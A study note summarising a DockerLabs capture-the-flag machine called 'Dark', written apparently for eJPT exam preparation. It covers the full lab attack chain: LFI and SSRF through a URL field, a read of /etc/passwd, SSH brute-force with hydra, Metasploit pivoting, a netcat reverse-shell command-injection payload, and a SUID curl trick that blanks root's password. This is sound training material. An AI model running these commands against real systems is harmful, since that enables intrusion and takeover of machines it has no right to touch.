---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 10.10.10.2
cves: []
tools: [nmap, gobuster, hydra, curl, metasploit, netcat, gtfobins]
techniques: [information-gathering, directory-fuzzing, source-code-disclosure, local-file-inclusion, server-side-request-forgery, ssh-bruteforce, reverse-shells, command-injection, pivoting, metasploit-pivoting, port-forwarding, suid-enumeration, writable-etc-passwd]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[chmod-4755]]", "[[littlepivoting]]", "[[server-side-request-forgery]]", "[[metasploit-pivoting]]"]
---

# Dark

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/dark.md)

Two-host box on the same layout as [[littlepivoting]]: one `process.php` URL field that **reads local files** ([[local-file-inclusion]]) and **fetches internal URLs** ([[server-side-request-forgery]]) → SSH brute-force → Metasploit pivot → `cmd` RCE on the inner host → SUID `curl` → root.

```
Kali (10.10.10.1) ─ 10.10.10.0/24 ─ dark1 (10.10.10.2, 20.20.20.2)
                                     └ 20.20.20.0/24 ─ dark2 (20.20.20.3)
```

`dark1` is the dual-homed pivot — the writeup never says so explicitly, but it has to be: `autoroute` + `portfwd` only reach `20.20.20.3` if `dark1` holds the `20.20.20.2` address on that subnet.

## Path — dark1 (10.10.10.2)

1. **Recon** — `sudo nmap -sn 10.10.10.0/24` finds `10.10.10.2` (and the `.1` gateway); `nmap -p- --open -sS --min-rate 5000 -n -Pn` → `22/tcp` ssh + `80/tcp` http ([[information-gathering]], [[nmap]]).
2. **Web enum** — `curl -s http://10.10.10.2` is a single form POSTing `url` to `process.php`; [[gobuster]] (`DirBuster-2007_directory-list-lowercase-2.3-medium.txt`, `-x php,html,txt,sql,zip`) → `index.html`, **`info`**, **`process.php`** (500 on GET — it wants a POST), `server-status` (403) ([[directory-fuzzing]]).
3. **Hint file** — `/info` = *"Toni te recuerdo que he publicado las bases de datos de telefonica, la dgt y el banco santander en mi pagina ilegal **(20.20.20.3)**"* — a host on a subnet you have no route to yet ([[source-code-disclosure]]).
4. **`url` parameter** — three probes with `curl -X POST --data "url=…"` split the behaviour in two ([[server-side-request-forgery]], [[local-file-inclusion]]):
   - `url=http://10.10.10.2` → the app fetched itself (same page back).
   - `url=info` → the **local file** `/var/www/html/info` echoed back (relative path → file read).
   - `url=http://20.20.20.3` → the **internal host's page** echoed back (`webilegal.com`, whose form posts `cmd` to `http://20.20.20.3/process.php`) — the server reached a network you can't.
   - `url=///////../../../etc/passwd` → `grep /bin/bash` → `root` + **`toni`** (the username for step 5).
5. **Foothold** — `hydra -l toni -P rockyou.txt ssh://10.10.10.2 -t 64 -F` → **`toni:banana`** ([[ssh-bruteforce]], [[hydra]]).
6. **Pivot setup** — SSH session → `exploit/multi/handler` shell → `shell_to_meterpreter` → `post/multi/gather/ping_sweep` on `20.20.20.0/24` finds **`20.20.20.3`** → `auxiliary/scanner/portscan/tcp` → `22`/`80` open → `portfwd add -l 8080 -p 80 -r 20.20.20.3` and `portfwd add -l 2002 -p 22 -r 20.20.20.3` ([[metasploit-pivoting]], [[port-forwarding]]).

## Path — dark2 (20.20.20.3)

1. **Web enum** — `curl -s http://localhost:8080` is the same page the SSRF fetch in step 4 already showed you — recon done *before* touching the box.
2. **RCE** — `curl -X POST http://localhost:8080/process.php --data "cmd=nc -e /bin/bash 20.20.20.2 4444"` → reverse shell caught by the `multi/handler` ([[command-injection]], [[reverse-shells]], [[netcat]]).
3. **Privesc** — `find / -perm -4000 2>/dev/null` → **`/usr/bin/curl`** → `sed 's/root:x:/root::/g' /etc/passwd > /tmp/passwd` + `curl file:///tmp/passwd -o /etc/passwd` → `root::0:0:…` → `su -` → **root** ([[suid-enumeration]], [[writable-etc-passwd]], [[curl]], [[gtfobins]]) — the exact [[chmod-4755]] primitive, twice in a row on the same platform.

## Credentials

| Host | User | Password |
|------|------|----------|
| dark1 (SSH) | `toni` | `banana` (rockyou) |

## Takeaways

- **A URL field is two vulnerabilities, not one.** Same parameter, same request format: relative path → local file read; `http://` → the *server* makes the request. Probe both before deciding what the bug is ([[local-file-inclusion]], [[server-side-request-forgery]]).
- **SSRF is recon, not just an exploit.** `url=http://20.20.20.3` handed you dark2's full page — form field, action URL, everything — while the host was still unreachable. You knew what to type before you had a route to it.
- **Fuzz first, POST second.** `process.php` returned `500`/size `0` to a GET, which reads like "broken". It's the opposite: an endpoint that *errors without input* is doing something with input.
- **Read the pivot's interfaces even when a module tells you the answer.** `ping_sweep` found `20.20.20.3`, but it's `ip a`/`hostname -I` on dark1 that tells you *why* you can reach it (`20.20.20.2` is yours) ([[pivoting]]).
- **`portfwd` twice, not once** — one relay per service (8080 → 80, 2002 → 22) is the whole point of the static forward: web enum *and* a login path without ever leaving `localhost` ([[port-forwarding]]).
- **Same primitive, same platform.** SUID `curl` + `file://`/`-o` was [[chmod-4755]]; if `find / -perm -4000` returns a *known* binary a second time, don't re-derive the payload — you already wrote it down ([[suid-enumeration]], [[writable-etc-passwd]]).
- **Gap in the writeup:** the dark2 callback is aimed at `20.20.20.2:4444` (dark1's inner address), but nothing in the notes shows how that connection reached Kali's `multi/handler` — a relay listener on dark1, a `portfwd`, or Kali holding `20.20.20.2`. Next run: record the listener side, not just the payload ([[reverse-shells]]).
- **Gap in the writeup:** how `cmd` was identified as executable is never shown — only the payload. The form field name is the clue, but the writeup skips the `; id` probe that would prove it ([[command-injection]]).
